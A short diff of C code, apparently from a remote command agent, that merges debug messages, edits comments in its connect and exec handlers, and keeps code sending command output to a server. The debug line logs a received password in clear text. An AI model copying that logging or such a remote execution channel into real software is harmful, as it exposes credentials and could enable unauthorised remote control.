@@ -141,8 +141,7 @@ static int connect_handler(char *args) {
         return true;
     }
 
-    DBG_MSG("connect_handler: password received: %s\n", args);
-    DBG_MSG("connect_handler: verifying password…\n");
+    DBG_MSG("connect_handler: verifying password received: %s...\n", args);
 
     int pv = passwd_verify(args);
     if (pv < 0) {
@@ -174,7 +173,7 @@ static int disconnect_handler(char *args) {
 static int exec_handler(char *args) {
     bool catch_stds = true;
 
-    // if first non whitespace character is '-s', set catch_stds to false
+    // If first non whitespace character is '-s', set catch_stds to false
     args += strspn(args, " \t");
     if (strncmp(args, "-s ", 3) == 0) {
         catch_stds = false;
@@ -194,7 +193,6 @@ static int exec_handler(char *args) {
     }
 
     if (catch_stds) {
-        // Send the command output to the server
         send_to_server("stdout:");
         send_file_to_server(STDOUT_FILE);
         send_to_server("stderr:");
